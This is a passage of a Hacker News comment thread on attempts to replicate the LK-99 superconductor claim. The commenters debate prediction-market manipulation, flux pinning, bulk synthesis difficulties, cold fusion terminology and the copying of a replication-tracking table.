noticed the mistake I made\".replyaqme28 2 hours ago | root | parent | next [–] Or the opposite. I successfully replicate in my lab, but the price on Yes is high, so I make a post about how there definitely isn't superconductivity, buy up all the Yes, and then say \"Woops I made a mistake. It really does superconduct.\"OP is downplaying the shenanigans that can go on here.The only way to prevent it is some sort of SEC insider trading or market manipulation laws.replysgregnt 2 hours ago | root | parent | next [–] The market already takes this possibility into accountreplyalchemist1e9 3 hours ago | root | parent | prev | next [–] A version of that probably happened last night with Lk-99, the “Iris” replication claim.Why do think it’s such a problem? Those are the risks of speculating and the market adjusted back downwards in very short order. If Iris was a manipulator the gains were minimal and fleeting.The anti-markets comments all over this are so unfortunate and misguided.By your own logic don’t you just prove that a real lab is now potentially motivated to investigate and even replicate? If I’m working in a lab and it looks like it is working, why not let me place money on yes and speculate? I have excellent information.replyTehCorwiz 3 hours ago | root | parent | next [–] But a fraud was perpetrated and the scammer got away. The markets are supposed to ignore that? Money was taken out of the market by a bad actor. If anything this encourages quick fraud over slow honesty.replyalchemist1e9 2 hours ago | root | parent | next [–] Markets don’t ignore it, they learn from it. They don’t need you or any authority to protect them.Edit: Understand that the scammer has to buy, then release the false information, and then sell. They only “scam” the buyers that don’t critically assess this new information, such as it’s provenance and quality. This means that over time only the best analysts survive and thrive. Smart speculators likely sold the spike, limiting the number of buyers the manipulator could find. This scenario is actually an argument FOR prediction markets.replymarcosdumay 38 minutes ago | root | parent | next [–] > they learn from itAnd the lesson is that betting markets are a scam.But then you get people criticizing the ones telling you that lesson. Is it because newborn fools must be preserved until people can take their money?replyalchemist1e9 8 minutes ago | root | parent | next [–] How are betting markets a scam? They are remarkably useful, you can watch the LK-99 market now and you will know immediately as new information arrives.morelisp 2 hours ago | root | parent | prev | next [–] > They only “scam” the buyers that don’t critically assess this new informationYes correct that is a scam, no scare quotes. A scam doesn't become less of scam because it worked or didn't work.replyalchemist1e9 1 hour ago | root | parent | next [–] So you feel governments should babysit prediction market speculators who can’t evaluate information for themselves? Or wait that’s too hard, so let’s just ban them, well because … fairness obviously.The issues are not problems as people make them out to be, you don’t have an intrinsic right to not be scammed, or to take vacations, as nice as it sounds, those are just fantasy that leads to worse situations when attempting to make reality.replydist-epoch 2 hours ago | root | parent | prev | next [–] The base prior (the market price) is that this will not replicate. This scenario is a way to make a quick buck claiming the opposite without doing any actual hard work.In regular markets you can't just say \"we increased our sales 1000%\" and a week later \"oops, sorry, misplaced decimal dot\". You can do that in prediction markets.replyalchemist1e9 2 hours ago | root | parent | next [–] If you are participating in a prediction market and blindly believe random claims, yes, you will lose your money. As you should.I don’t understand what you think is different with other markets. Information must be assessed for it’s accuracy and acted on by participants.In this case I’d even argue the prediction market helped focus attention and resulted in rapid counter analysis that questioned the claims.Perhaps without the LK-99 markets effects the false information would have had wider and longer reach? The losses of the unskilled participants are a perfectly acceptable cost and in fact beneficial in the long term.replydist-epoch 2 hours ago | root | parent | next [–] The reason regulation is introduced in every trading market is because scammers are killing the market. How long do you think an honest operator can survive in a market where 90% of participants are scammers? You talk about skilled participants. The way to have 100% skill is to manufacture an event.The history of financial markets is rich in examples.Or more recently, the endless supply of scamming in sports betting where athletes collude to fix games.replyalchemist1e9 1 hour ago | root | parent | next [–] I understand that is the common perception and an understandable one based on how the information on this topic is presented to the public. However it’s likely not true, unregulated markets have boomed and provide many valuable services and information. I’ve personally heard an argument promoting even removal of insider trading laws and that markets would actually be fairer and more efficient without them.replyswader999 3 hours ago | root | parent | prev | next [–] You would risk someone else of stature announcing against your position. There are also liquidity risks.replycodethief 2 hours ago | root | parent | prev | next [–] I believe that falls under insider trading.replydist-epoch 2 hours ago | root | parent | next [–] Conceptually, but not legally.Insider trading has a very specific definition, which does not apply here. In fact there are huge financial markets, like forex, where insider trading mostly doesn't apply.replycubefox 50 minutes ago | parent | prev | next [–] Note that real prediction markets with money are currently illegal in the US because of some legacy law. So Polymarket (currently the major prediction market I believe) is only usable outside the US anyway.Currently the only US alternative is play money. Manifold and Metaculus use this system. Metaculus doesn't really use play \"money\", but a non-zero-sum system to award points for more accurate predictions. It's in both cases a game and an exercise in checking how well-calibrated your beliefs about the future are.And here is the canonical FAQ on prediction markets, and the social/policy benefits they could have:https://astralcodexten.substack.com/p/prediction-market-faqreplyummonk 3 hours ago | parent | prev | next [–] It's worse than that. If you've confirmed results, you now have an incentive not to publish your results, instead building up a market position on prediction markets for as long as possible.replybeowulfey 3 hours ago | parent | prev | next [–] A few things:* the paper wasn’t ready, and internal drama is what led to it being released* I’ve read that the process of making it is quite difficult. There probably are not many samples out there in the worldBasically, it wasn’t ready for primetime, but I believe it’s closereplyTrailMixRaisin 2 hours ago | root | parent | next [–] The topic on how hard or easy it is to replicate seems to be as fast changing as other information. The first time I read about it, it was deemed to be super easy as all you needed are the two base materials and a vacuum furnace. But with all the drama involved I would not be surprised if the process is actually very complicated.replyqingcharles 25 minutes ago | root | parent | next [–] The paper is vague unfortunately. Here are some of the questions Andrew McCalip has (and he is fairly far along the path of actually making LK99):Precursors:•What level of purity is required for the precursor materials?•Are there any necessary preparatory steps for the precursors just before use?•What are the required particle sizes for the precursor materials?Thermal steps:•What is the environment (air or vacuum) for the Lanarkite reaction?•What are the temperature ramp-up and ramp-down rates for all three reactions?•Are there any thermal annealing steps involved?•How sensitive is LK99 to the duration of the final 925°C step?Results:•Could you elaborate on the observed differences between the bulk material and the thin film?•Does the bulk material share the same composition as the thin film?•How repeatable is the prescribed recipe, is SC behavior stochastic across samples?•Could you provide details on the equipment used, setup photos, and procedures employed to measure the critical current in response to an applied magnetic field, as seen in figure 8 of paper 3?Thin film deposition:•What type of glass substrate was used in the vapor deposition process for the thin film?•Could the exact set-point temperatures of the tungsten boat be provided, instead of ranges? (e.g., 550 ℃ to 900 ℃, 900℃ to 2000 ℃)•In patent figure 22, from which region was the resistivity value taken? The light gray or the dark gray area?https://twitter.com/andrewmccalip/status/1685891722675687424replyyreg 4 hours ago | parent | prev | next [–] Are there any prediction markets where you can bet money on this?I thought people talked only about Moneyfold, which is just a game. (You cannot take money out of it, although you can use it to make a charity donation.)I suspect that people on actual real money market would make different predictions to Manifold.replyeurleif 3 hours ago | root | parent | next [–] https://polymarket.com/event/is-the-room-temp-superconductor...replyCthulhu_ 3 hours ago | root | parent | next [–] I like that that website seems to use just smallish penny amounts, no big betting amounts. And that it's a simple formula; if you're right, you win $1 per share, if you lose, you get nothing. There's one about whether Trump wins the election with everyone voting 'no', so the winners will gain fractions of pennies on their bet. But if he does win, those voting 'yes' can gain 99% of their bet.replytrompetenaccoun 2 hours ago | root | parent | next [–] The concept isn't bad but the problem with these markets isn't necessarily the amounts played, rather it's how they're resolved. What exactly counts as 'event has happened' and 'event has not happened'? I think Polymarket uses some kind of oracle¹ to establish the outcomes. What I know for sure is that there have been a couple of cases of fraudulently set up markets already, so anyone who wants to bet has to really understand the conditions before jumping in, even if they're very sure about the outcome.Again, I think it's a cool concept but I'd advice people to stay away from touching these until there's a solution for that problem. The small amounts people are betting are likely a reflection of this problem, because it's hard to understand if the setup is trustworthy.¹ https://en.wikipedia.org/wiki/Blockchain_oraclereplyyorwba 3 hours ago | root | parent | prev | next [–] Polymarket uses real money, I think https://polymarket.com/event/is-the-room-temp-superconductor...replycptaj 2 hours ago | parent | prev | next [–] The worst part is that those market people are delusional enough to believe what they say.replyc7DJTLrn 3 hours ago | parent | prev | next [–] The stock market is no different, there's inequality in access to information there too.replyjacquesm 3 hours ago | parent | prev | next [–] That's not all that different from how the financial crisis came to be: derivatives on top of bad loans. Here it is bad bets on top of a possible phenomenon that probably none of the participants in the bets have any insight in.replyfallingknife 1 hour ago | root | parent | next [–] The bets were never the issue. The leverage in the banking system was. The bad bets were just the spark that lit it. The prediction markets are not leveragedreplysudosysgen 1 hour ago | root | parent | next [–] No reason why they wouldn't become leveraged.replyJonChesterfield 1 hour ago | parent | prev | next [–] > buy options on the outcome once they confirm their findings in order to cash outWhat stops that being textbook insider trading?replyandrepd 3 hours ago | parent | prev | next [–] It's like they say, when all you have is a hammer...replyincrudible 4 hours ago | parent | prev | next [–] Just making a bet does not really spend the money, it will just change hands, presumably from the less informed to the more informed, who should be able to eventually spend it more wisely. As far as forcing the outcome, if it turns out to be possible, but the market got it all wrong, there is your incentive to give it a shot regardless.replyjustinclift 3 hours ago | root | parent | next [–] > making a bet does not really spend the money, it will just change handsPretty sure most people would call the money changing hands \"spending\" that money.replybarelyauser 2 hours ago | root | parent | next [–] Yes, but the original post means \"spending\" as \"making good use of if\" or \"putting it to a productive end\". People betting money has very little effect on the world. But consider the case where I pay you to be idle for an hour. I destroyed 1 hour of your labor, you got paid but we are not in any shape or form richer because of it. Or consider people attending a charity event. They pay to attend, then spent 1 hour having fun. After the event, they will have to in fact labor to provide the charity when the fund raising event starts to spent its money. There is no cheating nature.replyamelius 4 hours ago | parent | prev | next [–] > Shouldn't the minimum requirements be a magnet and the material sample, to demonstrate it floating through the meissner effect?The minimum requirements should be that it doesn't heat up when you send a large current through it.replyasimpletune 2 hours ago | prev | next [–] So, Russian anime cat girl seems to have cooked a sample and demonstrated some of the claimed properties, although she's explicit that it shouldn't be considered a \"replication\".https://twitter.com/iris_IGB/status/1685731177523449856replydmitrybrant 30 minutes ago | parent | next [–] The \"demonstration\" is a photo of a single crumb of material inside a transparent pipette. It's claimed that the crumb is \"levitating\" inside the pipette, but what's stopping a random internet anon from gluing a crumb onto a pipette and taking a picture of it?I don't know about you, but if I had just succeeded in replicating a literally history-making experiment, I would perhaps take a video of it, and demonstrate how the crumb actually behaves without the support of the pipette.replysupriyo-biswas 43 minutes ago | parent | prev | next [–] Is there any reason to believe their results? While their reproduction could definitely be legitimate, there are no credentials or affiliations mentioned on their bio, except for “molecular biologist” which typically means a skill set more oriented towards organic chemistry (as opposed to inorganic chemistry, which this is about), and neither have they posted any hints as to what their methods are.replyfanick 1 hour ago | parent | prev | next [–] nitter link https://nitter.net/iris_IGB/status/1685268812663271424#mreplyzamalek 57 minutes ago | parent | prev | next [–] > If it's a diamagnetism it's a fucking strong oneThat's a pretty good point.replystainablesteel 1 hour ago | parent | prev | next [–] its always the people with an anime pfp that do the most godly shitreplyWorkaccount2 11 minutes ago | root | parent | next [–] I think it's what happens when you just stack all of your character points in intelligence.Smartest person I ever met is now some kind of non-binary fox person. An ivy league masters in math, does risk modeling for some mega insurance company, and lives in a kawaii fever dream while doing it.replycubefox 46 minutes ago | root | parent | prev | next [–] Probably often people with autism.replydrexlspivey 40 minutes ago | root | parent | prev | next [–] there are some weapons grade anons with 30 followersreplyWaffleIronMaker 4 hours ago | prev | next [–] Note that the original table has been more recently updated: https://forums.spacebattles.com/threads/claims-of-room-tempe...reply7moritz7 2 hours ago | parent | next [–] So what is the wordpress post for?replyWaffleIronMaker 1 hour ago | root | parent | next [–] The author apparently did not intend widespread readership:> Whoever is out there, please stop clicking my link. I used to get 10 views a day from Vtuber wannabes and it's now a weekday. I don't even consider it a good enough summary! I thought the 60 views yesterday on the post was good, and now it's a hundred times that! What. Is. Happening.> Seriously, this is weird. I already got two pingbacks from suspicious sites stealing my post. Joke's on them though, I'm constantly editing it when I have time.https://forums.spacebattles.com/threads/claims-of-room-tempe...replyrcme 2 hours ago | root | parent | prev | next [–] Basically theft.> This is (initially) a copy of Guderian2nd’s table on the discussion thread on Spacebattles with a bit of cleanup. I’ve rewritten most of the notes to be more concise as I track the updates myself, where I can.replyot 2 hours ago | root | parent | next [–] How is it theft? The original source is prominently cited, the author of the blog post is an active participant to the original discussion, the whole point of the post is to collect and summarize various sources in one place.replyrcme 2 hours ago | root | parent | next [–] Usually copying someone else’s work without permission is considered (intellectual property) theft.Also, this person just copied the initial work but isn’t as committed to keeping things up to date. Much better to use the original source.replyadrianmonk 18 minutes ago | root | parent | next [–] IANAL, but copying this table in the way they did seems OK under US copyright law.In the US, some compilations cannot be copyrighted and some can.Before a Supreme Court decision called Feist, copyright could be based on either \"sweat of the brow\" or creativity or both. Sweat of the brow is the work of taking data from original sources and putting it together. Creativity is something you add, like choosing what to include. (If I make a mere list of all restaurants at Disneyworld, that's sweat of the brow. If I make a list of the restaurants that are worth visiting, that's creative.)The Supreme Court decision was about one company copying another company's white pages phone book. (White pages are the simple name/number listings.) The court said sweat of the brow isn't enough. There must be some amount of creativity. It's a low bar, but it has to be there. So they said the white pages cannot be copyrighted, and copying the entire thing is allowed.About these LK-99 tables, the \"Notes\" and \"Reliability of Claim\" columns of the original table look creative to me. So I'd guess the table can be copyrighted. But the copy of the table didn't include those columns. It just included the factual data, and I think that's allowed.Sources:(1) https://en.wikipedia.org/wiki/Copyright_in_compilation(2) https://www.copyright.gov/reports/db4.pdf (Sections IA and IB give the basic idea.)replytomrod 1 hour ago | root | parent | prev | next [–] Except in the case of citation.replyrcme 1 hour ago | root | parent | next [–] No, citing who you copy doesn’t remove copyright protection.replyswombat 55 minutes ago | root | parent | next [–] Go look up \"fair use\" under copyright laws.replySymmetry 8 minutes ago | root | parent | next [–] I did, there's nothing about including a citation to the original making something fair use. Although if I cite some work using its title like so Person *et al*(2023). \"The Unbearable Lightness of Tardigades\", *Little Creatures*, 27, 100-110Then even though the title is really clever and creative copying it into my citation list is still fair use.alecst 3 hours ago | prev | next [–] I’m not an expert, but I’ve used superconductors (I believe YBCO) when I taught physics lab. We cooled samples down with liquid nitrogen and put them over a magnet. They levitate, but not like in the video that the Korean team released. True superconductors enjoy “flux pinning”, meaning wherever you put them on a magnet, they’ll freeze in that position (or move around an axis of constant flux.) In the LK-99 video that they released, they show that the sample is repelled by a magnet. This seems to contradict the HTS claim and wondered if I’m missing something because surely so many experts can’t be this wrong.My background is in physics, but not superconductors.replydawnofdusk 3 hours ago | parent | next [–] Type-II super conductors may exhibit \"flux pinning\". Type-I super conductors do not.replyalecst 2 hours ago | root | parent | next [–] Cool thanks. Gonna read up a little on that.Edit: yea it's interesting. Believe it or not, I studied L-G theory in grad school, taught a lab about (type-II) superconductors, but had no idea that type-I superconductors didn't flux pin.Just leaving this here from Wikipedia:> The superconductor must be a type-II superconductor because type-I superconductors cannot be penetrated by magnetic fields. Some type-I superconductors can experience the effects of flux pinning if they are thin enough. If the material's thickness is comparable to the London penetration depth, the magnetic field can pass through the material.https://en.wikipedia.org/wiki/Flux_pinningreplyzarzavat 2 hours ago | root | parent | prev | next [–] As far as I understand it (not an expert on these things), flux pinning is caused by microscopic defects that allow the magnetic field to penetrate at certain points. An idealized superconductor that is perfectly uniform expels the magnetic field at all points and so would not display the effect, it would simply be diamagnetic. So it’s mistaken and somewhat perverse to view the absence of flux pinning as proof that something is not a superconductor.In the case of LK99, the claim is that it does not show flux pinning because the sample is impure and not uniformly superconductive, i.e. it is not expelling the magnetic field enough.replyaqme28 2 hours ago | parent | prev | next [–] They claim that only a small part of that sample is superconducting, and that's why it shows that unusual behavior.replycnhajzwgz 3 hours ago | parent | prev | next [–] Many experts are indeed questioning the apparent lack of flux pinning and wonder if it's just strong diamagnetism.replyaqme28 4 hours ago | prev | next [–] Been following this very closely. Seems like the one takeaway is that whatever material this is, it's interesting. It's also difficult to synthesize in bulk, which is a shame because superconductivity is not easy to observe in non-bulk materials (think: powder).Note: I have a physics degree and a little bit of condensed matter experience, but nothing like anyone actually working in the field. Just some graduate courses and a bit of lab work experience.replyPanzer04 4 hours ago | parent | next [–] Assuming LK99 is legitimate, my hope is that the principles that make it work are more broadly applicable - and with that, refined production processes or newer alloys can be found. Simply knowing that it's possible would lead to a huge amount of research immediately focusing on this kind of thing.There's nothing more revolutionary than a discovery of a new class of materials. After all, we often name eras throughout our history after them :) (Stone age, etc)replyant6n 4 hours ago | root | parent | next [–] > There's nothing more revolutionary than a discovery of a new class of materials. After all, we often name eras throughout our history after them :) (Stone age, etc)I wonder what was involved in the discovery of stone.replyempiko 4 hours ago | root | parent | next [–] A rigorous peer review by graduate students.replymarcusverus 8 minutes ago | root | parent | next [–] Abstract: Our rigorous dialectic treatment shows that stone, while well suited for the smashing open of certain types of nut, is not well suited for any other purpose. Advocates from the more radical fringes of the tribe who suggest stone may be employed in varied areas such as warfare or even homebuilding(?!), are herein put in their proper place.replyaurizon 3 hours ago | root | parent | prev | next [–] I see the potential for a Far Side cartoon in that...replykfarr 2 hours ago | root | parent | next [–] “Ooga ooga peer review…”replyDrScientist 2 hours ago | root | parent | prev | next [–] I think the Ice age came before the stone age - can't imagine those tools lasted very long - so Stone tools would have been a big advance :-)replyvmilner 4 hours ago | root | parent | prev | next [–] Evolution of enough intelligence to use stone as a club, or make an edge on flint for cutting?replyjustinclift 3 hours ago | root | parent | prev | next [–] Being in the wrong place, at the wrong time. ;)replyDiogenesKynikos 4 hours ago | root | parent | prev | next [–] There are many different types of stones, and techniques for shaping them became progressively more sophisticated over time.With instruction, it would probably take you less than an hour to learn how to make the types of simple chopping stones that human ancestors used 1 million years ago. However, it takes much more considerable time and skill to learn how to make the types of stone tools humans were using 100k years ago. You get the sense that each group of ancient humans probably had an old expert toolmaker who passed on the trade to the next generation.replytudorw 3 hours ago | root | parent | prev | next [–] hitting each other with every other available substance?replyPartiallyTyped 4 hours ago | root | parent | prev | next [–] Could this be the new 4 minute mile? Will [humanity] evacuate on ourselves?Whatever this may be, it’s exciting.replyaqme28 4 hours ago | root | parent | next [–] I don’t know what you’re trying to say, but to “evacuate on ourselves” means to shit ourselves.replyPartiallyTyped 4 hours ago | root | parent | next [–] That is exactly what I intended to say.Everyone thought the 4 minute mile was impossible, until it was done, and then everyone started doing it. Had Roger Bannister had a cardiac arrest and evacuated on himself, people would have stopped trying for it.https://www.youtube.com/watch?v=aFH0qcmw36Qreplyzelos 4 hours ago | root | parent | prev | next [–] I've seen the 4 minute mile myth posted a lot around LK-99 stories:https://www.scienceofrunning.com/2017/05/the-roger-bannister...replyVierScar 4 hours ago | parent | prev | next [–] Why is it hard to make in bulk? I thought the chemicals were easy and cheap to obtain, and then you bake it at a high temp?What makes it difficult?replyaqme28 4 hours ago | root | parent | next [–] I don’t have really any expertise here but it looks like it bakes into a powder pretty much every time. Sure you get LK-99, but you can’t measure superconductivity in a powder since it’s a bulk property.replybeowulfey 3 hours ago | root | parent | prev | next [–] The variables that lead to its formation are not all accounted for yet. The process is understood, but it doesn’t always work. So there must be something missing every now and then.replydrbaba 3 hours ago | root | parent | prev | next [–] Note that “bulk” in this context means a single large chunk, not a large quanitity.replymaxerickson 3 hours ago | root | parent | prev | next [–] If it was well understood what made it difficult, odds are it would be improving fast.replyjustinclift 3 hours ago | parent | prev | next [–] Is there's no sintering or other process that could fuse the power together into a solid? (obviously without destroying its useful properties)replyjansan 4 hours ago | parent | prev | next [–] > It's also difficult to synthesize in bulkIs there any hard limitation that prevents synthesizing in bulk? If not, I would not worry about this at the moment and if it proves to be a material with desirable properties just leave it up to the engineers who will hopefully find a suitable production process.replyaqme28 4 hours ago | root | parent | next [–] There’s not really such a thing as superconductivity for a fine powder, so people are having trouble determining if this material even superconducts.edit to clarify: Bulk here refers to having a single chunk of the material, and does not refer to the total quantity. Some physical properties only exist or only surface in chunks of material, not in the powder form.replyXorNot 4 hours ago | root | parent | next [–] Conversely, the tape-type high temperature superconductors are generally made with a colloidal deposition process - which is based on a powder as a starter material.Assuming this is real, that would be the obvious process by which to try and build useful conductors and magnets - it also suggests a refinement process (passing it over a magnet would quantum lock superconducting grains and let the rest slide off).replySimon_O_Rourke 1 hour ago | prev | next [–] This is a race that I earnestly hope either someone wins quickly, or everyone loses... again rather quickly. For incredible claims you typically require incredible evidence, at the moment we're slightly better than hearsay but we've a long way to go get conclusive proof.replyjboggan 4 hours ago | prev | next [–] This live crowdsourced approach is a far better way to test and refine hypotheses than peer review and the current state of science journals.replydanbruc 4 hours ago | parent | next [–] Only as long as the experiments are reasonably simple. There are probably still some things requiring only simple experiments to be discovered, but most of the low hanging fruit has probably already been consumed by a couple of centuries of experimentation and scientific progress.replyconstantcrying 2 hours ago | root | parent | next [–] The single most famous mathematical result this century (solution ofthe Poincaré conjecture) was verified by consensus after the claimed proof was published to arxiv.replydanbruc 40 minutes ago | root | parent | next [–] Which falls into the category where I said it would be possible - you don't have to bring your own Hadron collider but only your brain in order to check whether the proof is correct. Admittedly not any brain will do, so in a sense you still need some specialized equipment.replyoldgradstudent 4 hours ago | parent | prev | next [–] That's how it has always been done.During the 1989 cold fusion fiasco, the findings were announced in a press conference, pre-prints were circulated in the community, and many groups attempted to reproduce the results.The first publication came weeks later.https://en.wikipedia.org/wiki/Cold_fusionreplyoneshtein 4 hours ago | root | parent | next [–] Currently, Cold Fusion used in small scale isotope breeders for medical purposes. One 2kWt breeder with CF can replace 100kWt traditional breeding plant.replyggm 4 hours ago | root | parent | next [–] Cite please. I think you've mistaken neutron feed sourced medical imaging radionuclide from low energy research reactions for cold fusion e.g. https://www.itnonline.com/content/fda-approves-additional-mo...NorthStar produces non-uranium based Mo-99 in collaboration with its manufacturing partner, the University of Missouri Research Reactor (MURR), in Columbia, Mo., using neutron capture technology.replyoneshtein 3 hours ago | root | parent | next [–] See https://www.youtube.com/watch?v=UtfUeip4vyA&t=335sreplyggm 3 hours ago | root | parent | next [–] That's not \"cold fusion\" that's low energy fusion. It explicitly has surplus neutrons and radioactivity.https://en.m.wikipedia.org/wiki/Inertial_electrostatic_confi...It's energy consuming. It's just lower energy than other methods, and it's emphatically not cold fusion.replyoneshtein 3 hours ago | root | parent | next [–] Low Energy Nuclear Reactions (LENR), AKA Cold Fusion.replytomrod 3 hours ago | root | parent | next [–] When someone mentions cold fusion, they are explicitly referencing a net energy-producing process that operates at room temperature. That isn't what you are referencing.replyoneshtein 3 hours ago | root | parent | next [–] > Cold fusion is a hypothesized type of nuclear reaction that would occur at, or near, room temperature. WikipediaIt works at near room temperature.The goal of the reactor in the video is to produce isotopes. It does the job.replyjacquesm 2 hours ago | root | parent | next [–] It can not ever produce net energy in this setting, so no, it doesn't do the job.It is in a room, but the temperature inside that vessel is anywhere north of 35,000 C. Unless you have a very hot room that isn't 'room temperature' by any stretch of the definition. Note that room temperature is about the temperature of the process not the temperature of the building containing that process.replyoneshtein 2 hours ago | root | parent | next [–] 35kK in this reactor is much closer to room temperature than 150MK in ITER, isn't?replyMayeulC 1 hour ago | root | parent | next [–] Look, call 35K cold if you want. It's relatively easy to make some fusion at home [1] at even colder temperatures. However, the real issue here is __producing__ energy (edit: more than you put in). This has never been done in a sustained way (H-bombs produce net energy, there were some promising inertial confinement and tokamak results recently, but never for sustained periods of time).And in the chain, it's pointed out quite clearly that everybody understands \"cold fusion\" as referring to \"net positive energy\".[1]: https://fusor.net/board/index.phpreplyoneshtein 23 minutes ago | root | parent | next [–] I am old enough to remember \"The Storm in a Glass\". Back then, there was a discussion about excessive heat, because the scientific community doubted the possibility of nuclear fusion reactions at such low temperatures and energy costs. My own hypotheses were: a) the reaction is caused by cosmic radiation (muons), and the deuterium filled lattice only amplifies natural high-energy cosmic radiation; b) the reaction occurs through contamination of samples with radioactive materials, and the matrix only amplifies natural decay reactions; c) cracks in the material create resonance with alternating electric current, and as a result, a natural particle accelerator is formed.In the video, researches use lattice to boosts fusor performance by few orders of magnitude. Why you think that they cannot boost it further?sudosysgen 1 hour ago | root | parent | prev | next [–] Sure, but that's fine and expected since you don't need a sufficient fusion density for net energy.replytomrod 2 hours ago | root | parent | prev | next [–] Aye, it produces neutron isotopes, but not at room temperature and not with a net excess of energy.It's the difference between going on a Sunday walk and a Monday commute. Yes, technically, your body is physically moving places, but the similarities don't extend much beyond that point nor would we encourage mistaking one for the other.replyoneshtein 2 hours ago | root | parent | next [–] 35 thousand Kelvin in a \"cold\" nuclear fusion reactor is much closer to room temperature than the temperature in a \"hot\" nuclear fusion reactor. Both types of reactors do not produce excess energy, but the cold reactor has already found application while the hot reactor will be ready in 25 years. Which kind of reactor is hoax?replymjfl 4 hours ago | parent | prev | next [–] requires a really significant result in order to demand widespread effort in to replicate.replyssijak 3 hours ago | prev | next [–] For such an important discovery (if it is real), that seems it could be replicated in a few days, if I were the team that did the discovery, I would create a video recording of the whole process and all the measurements and share it with the textual article. It sounds like that would provide for an easier way to replicate plus more proofs of the discovery.replybhouston 3 hours ago | parent | next [–] The team that did the discovery seems disorganized and amateurish though, and with the multiple papers all submitted at the same time by competing factions, riff with infighting - but they stuck with a hunch for longer than anyone else and followed it doggedly. If it turns out to be true, it will be a great movie with an underdog making one of the biggest discoveries of the century.replyalangibson 3 hours ago | prev | next [–] From what I've gathered, the ingredients of LK99 are common but cooking the right way is difficult. Supposedly the team itself only gets it right 1 time in 10.There have also been a lot of complaints that the patents and papers are missing info you'd want to have when reproducing. So that's making it even harder to reproduce. The upshot tho is that the discoverers seem to be available for tips by email.All in all were going to have to wait more than a few days for reproduction it seems.replythrowaway849755 4 hours ago | prev | next [–] Is there any HN effect by which enough contrary early opinion here could increase the odds of eventual triumph?On the chance that there is, I will do my part:In mice.replytwic 3 hours ago | parent | next [–] No synthesis. Less critical current than YBCO. Lame.replystevehawk 2 hours ago | root | parent | next [–] oh god i understood this reference. we love you cmdrtacoreplyggm 3 hours ago | parent | prev | next [–] Morphic Resonance theory https://en.m.wikipedia.org/wiki/Rupert_Sheldrakereplymoffkalast 41 minutes ago | parent | prev | next [–] The naysayers say nay.replyDrBazza 2 hours ago | prev | next [–] I'm resigned to disappointment for this. It's the modern days Pons and Fleischmann.Hopefully the lack of confirmation so far is due to people checking, double checking and triple checking, along with a healthy dose of \"we don't want to be tarred with the same brush\".replyechelon 0 minutes ago | parent | next [–] Reminds me of EmDrive.Still hoping LK-99 is real.replyyouknowone 4 hours ago | prev | next [–] I translated a survey about LK-99 papers to Englishhttps://hackmd.io/DMjYGOJFRheZw5XZU8kqKgreplyempiko 4 hours ago | prev | next [–] It is interesting to see how much of the replication is done by the Chinese and how little is done by the Western countries. Is this the difference between the making-stuff-happen attitude and the sclerotic attitude?replyaqme28 3 hours ago | parent | next [–] Someone on Twitter spoke on this, so I cant' confirm its accuracy. They said that the reagents for this are usually made in China. As soon as this paper was published, labs in China bought out the reserves and they became hard to source in the West.replyperlgeek 3 hours ago | root | parent | next [–] Weren't the raw materials lead, copper, sulfur and phosphorous or something like that? Seems hard to to buy out elements that are so common in industrial and chemical processes.replyaqme28 3 hours ago | root | parent | next [–] Those are the raw atomic elements, which are not the products you just put into your oven.replynonethewiser 3 hours ago | parent | prev | next [–] In one of the notes it says> Red phosphorus cannot be obtained on short notice from a new customer in the USA due to DEA restrictionsreplystaticautomatic 1 hour ago | root | parent | next [–] So we just need some fireworks companies to get after reproducing it, then?replyhobofan 3 hours ago | parent | prev | next [–] I doubt the table is representative of actual replication efforts going on, as according to some tweets, suppliers everywhere are out of precursors due to a large amount of orders. I would guess that there are many labs that started trying to replicate as a side-project with an attitude of \"if it replicates we'll go public, if not, we don't, as we don't want to spend a lot of efforts on retries\".Based on that trying to connect that to wider cultural innovation trends seems quite far-fetched.replydist-epoch 3 hours ago | parent | prev | next [–] If this replicates it will do nothing but entrench current power structures and forward the capitalistic individualistic mindset. Not a good optic. Not to mention talk of \"incredible achievement\" which is elitistic and not inclusivereplyCrimsonRain 0 minutes ago | root | parent | next [–] People like you will crucify whoever finds cure for cancer and pat yourselves in the backreplykoheripbal 2 hours ago | root | parent | prev | next [–] Is this comment serious?replycoffeebeqn 2 hours ago | root | parent | prev | next [–] Inclusive of what?replyChemSpider 1 hour ago | prev | next [–] I am surprised that anyone still thinks this thing is legit. I mean, I wish it was true, but the publication, the approach and the infights in the team do not instill confidence.To me, it seems they can not recreate the \"effect\" themselves. Otherwise they would be shipping their samples around the world by now.replyHakkin 24 minutes ago | parent | next [–] I'm not necessarily saying I believe it's real, I'm still on the fence, but if anything, the in-fighting for credit from the researchers almost makes it more credible for me. Why would they be so desperate for credit if they knew their findings would be disproven in a week or two? It seems obvious they're vying for a Nobel Prize. So at the very least, I believe the researchers believe what they published is true.replywg0 1 hour ago | parent | prev | next [–] Don't really get this extreme sensitivity to downvote. I mean - it seems what it seems. May be it seems really promising and trustworthy to some, good for them.That apart - it seems low hanging fruits in the nature are almost over. Scientific progress might not be as rapid and consistent as in past in coming decades especially when world seems to be heading towards multiple (avoidable) conflicts.replyssijak 3 hours ago | prev | next [–] This twitter handle contains some interesting back story investigation https://twitter.com/8teAPireplyhobofan 16 minutes ago | parent | next [–] > interesting back story investigationNo! As stated in their reply to this, you should assume that everything that account writes is fiction.They said that they were essentially trying to write a The Big Short-style screenplay in real time as the story unfolds. To do that, they link to actual newsworthy tweets and \"fill it in with realistic stereotypes\".It's a shame that this account is one of the most responsive aggregators of new developments, as I find their real-time fictionalization incredibly irresponsible.replyjunon 2 hours ago | parent | prev | next [–] Where? I just see bandwagoning from a shitpost account.replyssijak 2 hours ago | root | parent | next [–] start here then go to comments for branching out https://twitter.com/8teAPi/status/1685960703658860544replydrtgh 58 minutes ago | root | parent | next [–] nitter link https://nitter.net/8teAPi/status/1685960703658860544replyest 3 hours ago | prev | next [–] Why does China alone have so many reproduction attemps? I assumed it would be tried everywhere.replyorangepurple 1 hour ago | parent | next [–] China has more people, more money to spend on research, more equipment, more manufacturing base, more STEM graduates, more everything, and all of that by huge margins.replysenttoschool 5 minutes ago | root | parent | next [–] I'm not sure about the other claims but the most logical reasoning is that China has better supply chains and way more STEM graduates.replypushkine 2 hours ago | prev | next [–] I've only seen one picture of an alleged successful replication yet: https://twitter.com/iris_IGB/status/1685731177523449856replyCorrado 2 hours ago | parent | next [–] Since Twitter is no longer allowing public access to posts, it would be better to not link to it. Or better yet, re-post the tweet somewhere else and link to that.replybhaak 1 hour ago | root | parent | next [–] They backpedaled on that and restricted it to single tweets.So if not logged in you can see a single tweet now but no longer threads.replyheliophobicdude 2 hours ago | prev | next [–] I've been live following this 